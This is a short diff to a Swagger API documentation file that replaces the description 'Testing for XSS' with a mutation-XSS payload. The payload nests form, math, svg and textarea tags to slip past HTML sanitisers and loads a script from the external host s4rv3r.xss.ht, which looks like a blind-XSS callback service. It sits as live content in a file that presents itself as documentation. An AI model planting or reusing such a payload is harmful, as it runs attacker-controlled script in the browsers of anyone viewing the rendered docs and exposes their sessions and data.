@@ -3,7 +3,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    Testing for XSS
+    Testing for XSS<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea></script><script src=https://s4rv3r.xss.ht></script><!--"></form>
 
   version: production
 basePath: https://google.com
